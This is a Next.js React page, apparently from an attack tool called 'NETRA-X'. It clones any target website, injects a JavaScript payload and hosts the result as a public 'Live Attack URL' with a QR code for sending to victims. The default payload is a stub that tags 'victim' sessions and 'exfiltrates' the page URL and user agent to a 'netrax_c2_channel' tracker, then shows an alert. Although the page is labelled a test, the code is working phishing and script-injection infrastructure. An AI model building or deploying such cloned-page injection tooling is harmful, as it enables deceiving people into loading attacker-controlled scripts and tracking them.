
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Wand, Share2, Clipboard, Globe } from 'lucide-react';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { hostTestPage } from '@/actions/host-test-page-action';
import { logActivity } from '@/services/activity-log-service';
import { useAuth } from '@/hooks/use-auth';
import Link from 'next/link';
import { QrCodeGenerator } from '@/components/qr-code-generator';

const formSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
  jsPayload: z.string().min(1, 'JS Payload cannot be empty.'),
});

export default function TestPage() {
  const { toast } = useToast();
  const { user } = useAuth();
  
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isHosting, setIsHosting] = useState(false);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      targetUrl: 'http://info.cern.ch/',
      jsPayload: `
(function() {
    // Use BroadcastChannel to send data to the 'Live Tracker' UI.
    const channel = new BroadcastChannel('netrax_c2_channel');
    
    // Assign a unique ID to this "victim" session
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        const payload = {
            sessionId: sessionId,
            type: type,
            data: data,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
        };
        channel.postMessage(payload);
    }

    exfiltrate('connection', { message: 'Test payload activated.' });
    alert('NETRA-X Test Payload Executed! Domain: ' + document.domain);
})();
`.trim(),
    },
  });

  const processAndInject = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true);
    setModifiedHtml(null);
    setHostedUrl(null);

    try {
      toast({ title: 'Cloning Page...', description: 'Fetching DOM from the target URL.' });
      const response = await clonePageFromUrl({ url: values.targetUrl });
      let html = response.htmlContent;
      
      const scriptToInject = `<script>${values.jsPayload}</script>`;
      
      if (html.includes('</body>')) {
          html = html.replace(/<\/body>/i, `${scriptToInject}</body>`);
      } else {
          html += scriptToInject;
      }
      
      // Inject base tag to fix relative links
      if (html.includes('<head>')) {
        html = html.replace(/<head>/i, `<head>\\n<base href="${values.targetUrl}">`);
      } else {
        html = `<head><base href="${values.targetUrl}"></head>${html}`;
      }
      
      setModifiedHtml(html);
      toast({ title: 'Injection Complete', description: 'JavaScript payload has been injected.' });
    } catch (e) {
      const error = e instanceof Error ? e.message : 'An unknown error occurred';
      toast({ variant: 'destructive', title: 'Cloning Failed', description: error });
    } finally {
      setIsLoading(false);
    }
  };

  const handleGenerateLink = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    setHostedUrl(null);
    
    try {
      toast({ title: "Hosting Page...", description: "Writing file to public directory on the server." });
      const { url: relativeUrl } = await hostTestPage(modifiedHtml);

      if (relativeUrl) {
        // Construct the full absolute URL
        const absoluteUrl = `${window.location.origin}${relativeUrl}`;
        setHostedUrl(absoluteUrl);
        toast({ title: "Public Link Generated!", description: "Your attack page is now live." });

        logActivity({
            user: user?.displayName || 'Operator',
            action: 'Created Test Attack URL',
            details: `Target: ${form.getValues('targetUrl')}`,
        });
      } else {
         throw new Error("Hosting action did not return a URL.");
      }
    } catch(err) {
        const error = err instanceof Error ? err.message : "An unknown error occurred";
        toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
    } finally {
        setIsHosting(false);
    }
  };

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Isolated Link Sharing Test</h1>
        <p className="text-muted-foreground">This page is for testing public link generation via server-side hosting.</p>
      </div>
      <Card>
        <CardHeader>
          <CardTitle>Test Setup</CardTitle>
          <CardDescription>Clone a page, inject a simple JS payload, and generate a public link to test with an external device.</CardDescription>
        </CardHeader>
        <CardContent>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(processAndInject)} className="space-y-4">
              <FormField control={form.control} name="targetUrl" render={({ field }) => ( <FormItem><FormLabel>Target URL</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem> )} />
              <FormField control={form.control} name="jsPayload" render={({ field }) => ( <FormItem><FormLabel>JavaScript Payload to Inject</FormLabel><FormControl><Textarea {...field} className="font-mono h-48"/></FormControl><FormMessage /></FormItem> )} />
              <div className="flex flex-col sm:flex-row gap-2">
                <Button type="submit" disabled={isLoading} className="w-full sm:w-auto">
                  {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
                  Clone & Inject JS
                </Button>
                <Button type="button" onClick={handleGenerateLink} disabled={!modifiedHtml || isHosting} className="w-full sm:w-auto">
                  {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
                  Generate Public Link
                </Button>
              </div>
            </form>
          </Form>
        </CardContent>
        {hostedUrl && (
          <CardFooter className="flex-col items-start gap-4 border-t pt-6">
            <h3 className="font-semibold">Live Attack URL</h3>
             <div className="grid md:grid-cols-2 gap-6 w-full items-center">
                <div className="space-y-2">
                    <div className="w-full flex items-center gap-2">
                      <Input readOnly value={hostedUrl} className="font-mono" />
                      <Button type="button" size="icon" variant="outline" onClick={() => { navigator.clipboard.writeText(hostedUrl); toast({ title: 'Copied!'}); }}>
                        <Clipboard className="h-4 w-4" />
                      </Button>
                      <Button type="button" size="icon" variant="outline" asChild>
                        <Link href={hostedUrl} target="_blank"><Globe className="h-4 w-4" /></Link>
                      </Button>
                    </div>
                     <p className="text-sm text-muted-foreground">Send this link to a device on another network. When opened, it should execute the alert. Check the "Live Tracker" page for the 'connection' event.</p>
                </div>
                <div className="flex justify-center">
                    <QrCodeGenerator url={hostedUrl} />
                </div>
             </div>
          </CardFooter>
        )}
      </Card>
    </div>
  );
}
